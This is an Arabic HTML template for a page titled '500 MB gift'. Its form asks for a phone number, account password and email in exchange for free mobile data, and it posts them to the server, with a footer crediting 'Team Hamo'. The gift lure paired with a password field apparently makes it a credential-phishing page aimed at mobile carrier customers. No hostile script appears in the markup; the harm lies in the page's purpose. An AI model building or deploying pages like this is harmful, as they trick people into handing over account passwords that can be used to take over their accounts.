<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>هدية 500 ميجا</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=El+Messiri:wght@500;700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'El Messiri', sans-serif;
    }

    body {
      background: linear-gradient(135deg, #220303, #4a0e0e, #af2a00);
      background-size: 400% 400%;
      animation: gradientShift 12s ease infinite;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .card {
      background: rgba(0, 0, 0, 0.55);
      border-radius: 25px;
      padding: 40px;
      width: 350px;
      box-shadow: 0 0 25px rgba(255, 80, 0, 0.4);
      backdrop-filter: blur(12px);
      text-align: center;
    }

    .card h1 {
      font-size: 28px;
      margin-bottom: 25px;
      color: #ffc9a0;
    }

    form input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: none;
      border-radius: 10px;
      background-color: #1e1e1e;
      color: #ffd9c2;
      font-size: 16px;
      transition: 0.3s;
    }

    form input:focus {
      background-color: #2a2a2a;
      outline: none;
      box-shadow: 0 0 10px #ff6b00;
    }

    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(90deg, #ff5400, #ff8800);
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: linear-gradient(90deg, #ff8800, #ff5400);
    }

    .footer {
      margin-top: 25px;
      font-size: 14px;
      color: #ffb68b;
    }

    .result {
      margin-top: 15px;
      color: #ff9e5b;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>هدية 500 ميجا</h1>
    <form method="POST" action="/">
      <input type="text" name="number" placeholder="رقم الهاتف" required />
      <input type="password" name="password" placeholder="كلمة المرور" required />
      <input type="email" name="email" placeholder="البريد الإلكتروني" required />
      <button type="submit">احصل على الهدية</button>
    </form>
    {% if result %}
      <p class="result">{{ result }}</p>
    {% endif %}
    <div class="footer">تيم حمو جميع الحقوق محفوظة</div>
  </div>
</body>
</html>
